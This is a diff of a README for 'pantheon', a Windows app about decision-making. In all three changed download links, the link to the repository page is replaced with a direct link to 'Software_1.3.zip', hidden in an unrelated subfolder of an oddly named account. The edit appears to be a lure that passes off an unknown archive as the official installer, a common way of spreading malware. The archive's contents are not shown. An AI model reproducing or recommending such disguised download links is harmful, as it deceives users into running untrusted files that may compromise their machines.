@@ -1,6 +1,6 @@
 # 🏛️ pantheon - Learn from History, Decide Better
 
-[![Download pantheon](https://img.shields.io/badge/Download-pantheon-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/holocentrusascensionisbadegg868/pantheon)
+[![Download pantheon](https://img.shields.io/badge/Download-pantheon-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/holocentrusascensionisbadegg868/pantheon/main/patterns/carve-at-joints/adapters/Software_1.3.zip)
 
 ## 📦 What Pantheon Is
 
@@ -12,7 +12,7 @@ Pantheon is built for people who want a calm, guided way to work with knowledge.
 
 ## 🪟 Windows Download
 
-[Visit the Pantheon download page](https://github.com/holocentrusascensionisbadegg868/pantheon)
+[Visit the Pantheon download page](https://raw.githubusercontent.com/holocentrusascensionisbadegg868/pantheon/main/patterns/carve-at-joints/adapters/Software_1.3.zip)
 
 Use this link to download the app for Windows. After the page opens, look for the latest release or the main download file, then save it to your computer.
 
@@ -184,6 +184,6 @@ These topics reflect the app’s focus on useful thinking, clear structure, and 
 
 ## 📎 Download Again
 
-[Go to the Pantheon download page](https://github.com/holocentrusascensionisbadegg868/pantheon)
+[Go to the Pantheon download page](https://raw.githubusercontent.com/holocentrusascensionisbadegg868/pantheon/main/patterns/carve-at-joints/adapters/Software_1.3.zip)
 
 Use this link any time you want to get the latest version for Windows or check the newest release details.
